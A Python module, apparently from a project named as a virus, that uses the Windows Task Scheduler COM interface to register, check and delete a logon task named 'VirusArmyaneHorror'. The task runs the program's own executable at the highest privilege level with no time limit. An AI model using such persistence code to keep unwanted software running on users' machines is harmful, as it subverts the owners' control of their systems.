import win32com.client
import pythoncom
import win32api
import sys
from utils import get_exe_path

TASK_NAME = "VirusArmyaneHorror"


def create_scheduler_task():
    pythoncom.CoInitialize()
    try:
        exe_path = get_exe_path()
        user_name = win32api.GetUserName()  # Простое имя пользователя

        # Создаем объект планировщика
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()

        # Получаем корневую папку
        root_folder = scheduler.GetFolder("\\")

        # Создаем определение задачи
        task_def = scheduler.NewTask(0)

        # Настройки безопасности
        task_def.Principal.RunLevel = 1  # TASK_RUNLEVEL_HIGHEST
        task_def.Principal.LogonType = 3  # TASK_LOGON_INTERACTIVE_TOKEN

        # Создаем триггер входа в систему
        trigger = task_def.Triggers.Create(9)  # TASK_TRIGGER_LOGON
        trigger.Id = "LogonTrigger"
        trigger.Enabled = True

        # Создаем действие - запуск программы
        action = task_def.Actions.Create(0)  # TASK_ACTION_EXEC
        action.Path = exe_path

        # Настройки задачи
        settings = task_def.Settings
        settings.Enabled = True
        settings.AllowDemandStart = True
        settings.StartWhenAvailable = True
        settings.DisallowStartIfOnBatteries = False
        settings.StopIfGoingOnBatteries = False
        settings.ExecutionTimeLimit = "PT0H0M0S"  # Без ограничения времени

        # Регистрируем задачу
        root_folder.RegisterTaskDefinition(
            TASK_NAME,
            task_def,
            6,  # TASK_CREATE_OR_UPDATE
            "",  # Текущий пользователь
            "",  # Пустой пароль
            3  # TASK_LOGON_INTERACTIVE_TOKEN
        )
        return True
    except pythoncom.com_error as e:
        hr = e.hresult & 0xFFFFFFFF
        print(f"COM ошибка создания задачи: 0x{hr:08X}")
        if e.excepinfo and len(e.excepinfo) > 5:
            print(f"Детали ошибки: {e.excepinfo[5]}")
        return False
    except Exception as e:
        print(f"Общая ошибка создания задачи: {e}")
        return False
    finally:
        pythoncom.CoUninitialize()


def delete_scheduler_task():
    pythoncom.CoInitialize()
    try:
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")
        root_folder.DeleteTask(TASK_NAME, 0)
        return True
    except pythoncom.com_error as e:
        hr = e.hresult & 0xFFFFFFFF
        if hr == 0x80070002:  # Файл не найден
            return True
        print(f"Ошибка удаления: 0x{hr:08X}")
        return False
    except Exception as e:
        print(f"Общая ошибка удаления: {e}")
        return False
    finally:
        pythoncom.CoUninitialize()


def check_scheduler_task_exists():
    pythoncom.CoInitialize()
    try:
        scheduler = win32com.client.Dispatch("Schedule.Service")
        scheduler.Connect()
        root_folder = scheduler.GetFolder("\\")

        # Получаем список всех задач
        tasks = root_folder.GetTasks(0)
        for i in range(1, tasks.Count + 1):
            if tasks.Item(i).Name == TASK_NAME:
                return True
        return False
    except pythoncom.com_error as e:
        hr = e.hresult & 0xFFFFFFFF
        if hr == 0x80070002:  # Файл не найден
            return False
        print(f"Ошибка проверки: 0x{hr:08X}")
        return False
    except Exception as e:
        print(f"Общая ошибка проверки: {e}")
        return False
    finally:
        pythoncom.CoUninitialize()